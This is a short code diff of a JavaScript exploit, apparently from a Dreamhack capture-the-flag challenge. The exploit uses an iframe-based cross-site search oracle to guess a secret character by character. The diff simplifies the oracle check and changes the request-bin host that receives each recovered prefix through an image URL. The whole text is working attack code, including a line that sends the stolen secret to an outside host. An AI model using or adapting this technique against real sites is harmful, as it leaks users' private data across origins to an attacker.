@@ -6,10 +6,7 @@
             const iframe = document.getElementById("iframe");
             iframe.src = url;
             iframe.onload = () => { 
-                var divElement = iframe.querySelector('.sentence-list');
-                var ulElement = divElement.querySelector('ul');
-                var liElement = ulElement.querySelector('li');
-                if (liElement !== null)
+                if (iframe.querySelector('.sentence-list'))
                     return resolve();
                 else
                     return reject();
@@ -33,7 +30,7 @@
             for (let c of chars) {
                 if (await search(secret + c)) {
                     secret += c;
-                    img.src = `https://jzclzoj.request.dreamhack.games/${secret}`;
+                    img.src = `https://twbynht.request.dreamhack.games/${secret}`;
                     break;
                 }
             }
